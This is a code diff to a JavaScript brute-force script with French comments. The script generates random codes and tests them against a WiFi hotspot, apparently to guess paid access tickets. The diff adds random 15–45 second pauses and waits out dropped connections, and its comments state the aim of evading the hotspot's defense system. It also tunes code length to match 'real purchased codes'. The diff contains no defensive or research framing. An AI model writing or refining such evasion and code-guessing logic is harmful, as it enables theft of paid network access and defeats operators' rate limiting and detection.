@@ -72,7 +72,29 @@ async function testTicket(ticket) {
     }
 }
 
-
+// Délai aléatoire entre chaque tentative pour éviter le système de défense du hotspot
+async function pauseEntreEssais() {
+    // Vérifier d'abord si le réseau est toujours disponible
+    const enLigne = await Helper.isOnline(3);
+    if (!enLigne) {
+        console.log('📡 WiFi tombé — le hotspot a probablement coupé la connexion (système de défense).');
+        const retabli = await Helper.attendreConnexion(20);
+        if (!retabli) {
+            console.log('❌ Connexion non rétablie — arrêt.');
+            return false;
+        }
+        // Petite pause supplémentaire après rétablissement
+        const extraSec = 10 + Math.floor(Math.random() * 20);
+        console.log(`⏳ Pause de sécurité ${extraSec}s après rétablissement...`);
+        await Helper.sleep(extraSec);
+    } else {
+        // Pause humaine normale entre chaque essai (15–45 secondes)
+        const pauseSec = 15 + Math.floor(Math.random() * 30);
+        console.log(`⏳ Pause ${pauseSec}s avant le prochain essai...`);
+        await Helper.sleep(pauseSec);
+    }
+    return true;
+}
 
 let i = 1
 while (true) {
@@ -84,7 +106,8 @@ while (true) {
         break;
     }
 
-    const ticket = Helper.makeTicket({ lower: true, minLen: 7, maxLen: 7 })
+    // Longueur 6 ou 7 comme observé dans les vrais codes achetés
+    const ticket = Helper.makeTicket({ lower: true, minLen: 6, maxLen: 7 })
     const res = await testTicket(ticket)
 
     if (res) {
@@ -95,6 +118,10 @@ while (true) {
         console.log(`fin d'iteration.`);
         break;
     }
+
+    // Pause entre chaque tentative (avec détection de coupure WiFi)
+    const continuer = await pauseEntreEssais();
+    if (!continuer) break;
 
     i++
 }
